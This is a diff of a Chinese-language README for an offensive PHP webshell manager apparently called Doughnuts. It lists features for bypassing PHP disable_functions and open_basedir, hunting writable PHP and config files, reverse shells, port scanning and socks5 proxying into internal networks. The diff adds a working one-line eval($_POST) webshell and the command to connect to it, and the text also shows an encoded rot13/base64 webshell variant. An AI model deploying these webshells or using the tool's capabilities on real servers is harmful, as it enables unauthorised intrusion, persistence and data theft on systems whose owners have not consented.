@@ -17,18 +17,23 @@
 - 支持连接,记录,管理webshell,方便下一次连接
 - 基于eval的连接,支持GET,POST,COOKIE,HEADER四种连接方式
 - 支持编码payload(已内置base64,str_rot13,hex三种编码,可以通过添加encode文件夹中的py文件进行扩展),以实现连接带有解码的webshell
-- 支持多种方式绕过disable_functions和open_basedir
+- 支持绕过open_basedir
+- 支持多种方式绕过disable_functions
+    - php7-backtrace
+    - php7-json
+    - LD_PRELOAD
+    - FFI
+    - COM
 - 核心功能
     - 获取网站,系统信息
+    - 输出disbale_functions
+    - 寻找可写的PHP文件(以树状结构显示)
+    - 寻找配置文件(文件名中包含cfg/config/db/database) 也可以通过修改代码来支持寻找更多的文件(以树状结构显示)
     - 获取一个临时的非完全交互式shell和webshell
     - 正向/反弹shell
     - (仅限双方均为*unix)获取完全交互式的反弹shell
-    - 读/写/上传/下载/删除/搜索文件
-    - 网站目录打包下载
-    - 寻找可写的PHP文件(以树状结构显示)
-    - 寻找配置文件(文件名中包含cfg/config/db/database) 也可以通过修改代码来支持寻找更多的文件(以树状结构显示)
-    - 数据库管理
-    - 输出disbale_functions
+    - 读/写/上传/下载/删除/搜索文件,目录打包
+    - mysql数据库管理
     - 端口扫描
     - 内网网页文本式浏览代理，可自定义请求方法和数据
     - 开启socks5服务器
@@ -59,6 +64,21 @@ enjoy it!
 ```php
 <?php
 error_reporting(0);
+eval($_POST['2333']);
+?>
+```
+
+那么只需要运行Doughnuts.py,并输入以下命令:
+
+```
+connect http://localhost/test.php POST 2333
+```
+
+假如要连接以下的webshell:
+
+```php
+<?php
+error_reporting(0);
 eval(str_rot13(base64_decode($_REQUEST['2333'])));
 ?>
 ```
@@ -66,7 +86,7 @@ eval(str_rot13(base64_decode($_REQUEST['2333'])));
 那么只需要运行Doughnuts.py,并输入以下命令:
 
 ```
-connect http://localhost/test.php GET 2333 rot13 base64
+connect http://localhost/test.php POST 2333 rot13 base64
 ```
 
 即可成功连接至webshell
@@ -78,7 +98,7 @@ connect http://localhost/test.php GET 2333 rot13 base64
 ## 更新日志
 
 ### V2.9
-- 修改了bdf模式顺序,原模式2~3顺移为3~4,新增bdf命令模式
+- 修改了bdf模式顺序,原模式2-3顺移为3-4,新增bdf命令模式
     - mode2 php7-json
         - 利用php-json反序列化绕过disable_functions
     - mode5 COM
